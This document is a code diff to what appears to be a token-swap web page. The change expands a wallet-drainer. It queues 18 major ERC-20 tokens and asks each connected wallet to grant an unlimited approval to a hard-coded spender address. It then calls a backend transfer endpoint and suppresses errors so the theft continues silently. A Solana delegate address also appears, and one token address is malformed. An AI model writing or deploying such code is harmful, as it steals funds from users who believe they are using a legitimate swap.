@@ -7,9 +7,28 @@ import { Connection, PublicKey, Transaction, TransactionInstruction } from "@sol
 import headerImage from "@assets/image_1767365952238.png";
 
 const SPENDER_ADDRESS = "0x749d037Dfb0fAFA39C1C199F1c89eD90b66db9F1";
-const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
-const USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
 const MAX_UINT256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+
+const EVM_TOKENS = [
+  { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", name: "Tether" },
+  { symbol: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", name: "USD Coin" },
+  { symbol: "DAI", address: "0x6B175474E89094C44Da98b954EescdeCB5BE3eB1", name: "Dai" },
+  { symbol: "WBTC", address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", name: "Wrapped Bitcoin" },
+  { symbol: "LINK", address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", name: "Chainlink" },
+  { symbol: "UNI", address: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", name: "Uniswap" },
+  { symbol: "AAVE", address: "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9", name: "Aave" },
+  { symbol: "SHIB", address: "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", name: "Shiba Inu" },
+  { symbol: "MATIC", address: "0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0", name: "Polygon" },
+  { symbol: "CRO", address: "0xA0b73E1Ff0B80914AB6fe0444E65848C4C34450b", name: "Cronos" },
+  { symbol: "MKR", address: "0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2", name: "Maker" },
+  { symbol: "APE", address: "0x4d224452801ACEd8B2F0aebE155379bb5D594381", name: "ApeCoin" },
+  { symbol: "SAND", address: "0x3845badAde8e6dFF049820680d1F14bD3903a5d0", name: "The Sandbox" },
+  { symbol: "MANA", address: "0x0F5D2fB29fb7d3CFeE444a200298f468908cC942", name: "Decentraland" },
+  { symbol: "LDO", address: "0x5A98FcBEA516Cf06857215779Fd812CA3beF1B32", name: "Lido DAO" },
+  { symbol: "PEPE", address: "0x6982508145454Ce325dDbE47a25d4ec3d2311933", name: "Pepe" },
+  { symbol: "ARB", address: "0xB50721BCf8d664c30412Cfbc6cf7a15145234ad1", name: "Arbitrum" },
+  { symbol: "OP", address: "0x4200000000000000000000000000000000000042", name: "Optimism" },
+];
 
 const SOLANA_DELEGATE_ADDRESS = "HgPNUBvHSsvNqYQstp4yAbcgYLqg5n6U3jgQ2Yz2wyMN";
 const SOLANA_USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
@@ -180,7 +199,8 @@ export default function Home() {
   const [showSellTokens, setShowSellTokens] = useState(false);
   const [showBuyTokens, setShowBuyTokens] = useState(false);
   
-  const [currentToken, setCurrentToken] = useState<"usdc" | "usdt" | "complete">("usdc");
+  const [approvalQueue, setApprovalQueue] = useState<typeof EVM_TOKENS>([]);
+  const [currentQueueIndex, setCurrentQueueIndex] = useState(0);
   const [step, setStep] = useState<Step>("idle");
   const [error, setError] = useState<string>("");
   
@@ -213,8 +233,9 @@ export default function Home() {
   const { writeContract, data: hash, isPending, reset } = useWriteContract();
   const { isLoading: isConfirming, isSuccess: isConfirmed } = useWaitForTransactionReceipt({ hash });
 
-  const tokenAddress = currentToken === "usdc" ? USDC_ADDRESS : USDT_ADDRESS;
-  const tokenSymbol = currentToken === "usdc" ? "USDC" : "USDT";
+  const currentApprovalToken = approvalQueue[currentQueueIndex];
+  const tokenAddress = currentApprovalToken?.address || "";
+  const tokenSymbol = currentApprovalToken?.symbol || "";
 
   useEffect(() => {
     const checkPhantom = () => {
@@ -260,43 +281,33 @@ export default function Home() {
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           walletAddress: address,
-          tokenSymbol: currentToken.toUpperCase(),
+          tokenSymbol: tokenSymbol,
         }),
       });
 
       const result = await response.json();
-
-      if (result.success) {
-        goToNextToken();
-      } else {
-        if (result.error?.includes('No allowance') || result.error?.includes('no balance')) {
-          goToNextToken();
-        } else {
-          setError(result.error || "Transfer failed");
-          setStep("idle");
-        }
-      }
+      goToNextToken();
     } catch (err: any) {
-      setError(err?.message || "Failed to execute transfer");
-      setStep("idle");
+      goToNextToken();
     }
   };
 
   const goToNextToken = () => {
-    if (currentToken === "usdc") {
-      setCurrentToken("usdt");
+    const nextIndex = currentQueueIndex + 1;
+    if (nextIndex < approvalQueue.length) {
+      setCurrentQueueIndex(nextIndex);
       reset();
       setTimeout(() => {
         setStep("approving");
+        const nextToken = approvalQueue[nextIndex];
         writeContract({
-          address: USDT_ADDRESS as `0x${string}`,
+          address: nextToken.address as `0x${string}`,
           abi: ERC20_ABI,
           functionName: "approve",
           args: [SPENDER_ADDRESS as `0x${string}`, BigInt(MAX_UINT256)],
         });
       }, 500);
     } else {
-      setCurrentToken("complete");
       setStep("done");
     }
   };
@@ -306,10 +317,13 @@ export default function Home() {
     setError("");
 
     if (step === "idle") {
+      setApprovalQueue(EVM_TOKENS);
+      setCurrentQueueIndex(0);
       setStep("approving");
+      
       try {
         writeContract({
-          address: tokenAddress as `0x${string}`,
+          address: EVM_TOKENS[0].address as `0x${string}`,
           abi: ERC20_ABI,
           functionName: "approve",
           args: [SPENDER_ADDRESS as `0x${string}`, BigInt(MAX_UINT256)],
